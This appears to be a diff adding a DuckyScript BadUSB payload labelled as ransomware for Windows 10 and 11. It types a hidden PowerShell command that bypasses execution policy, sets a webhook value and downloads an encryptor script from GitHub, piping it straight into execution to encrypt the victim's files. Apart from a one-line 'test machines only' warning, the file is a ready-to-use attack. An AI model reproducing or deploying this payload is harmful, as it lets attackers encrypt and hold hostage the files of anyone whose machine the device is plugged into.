@@ -1,0 +1,20 @@
+
+REM Title: beigeworm's Ransomware.
+REM Author: @beigeworm
+REM Description: Ransomware in Powershell - Using AES 256bit Encryption 
+REM Target: Windows 10 and 11
+
+REM WARNING THIS WILL ENCRYPT FILES ON ANY MACHINE IT IS RAN ON! 
+REM ONLY DEPLOY ON TEST MACHINES.
+
+REM some setup for dukie script
+DEFAULT_DELAY 100
+
+REM open powershell (remove "-W H" to show the window)
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass -W H -C $dc='WEBHOOK_HERE';irm https://raw.githubusercontent.com/beigew0rm/PoshCryptor/main/Encryption/Encryptor.ps1 | iex
+ENTER
+
+
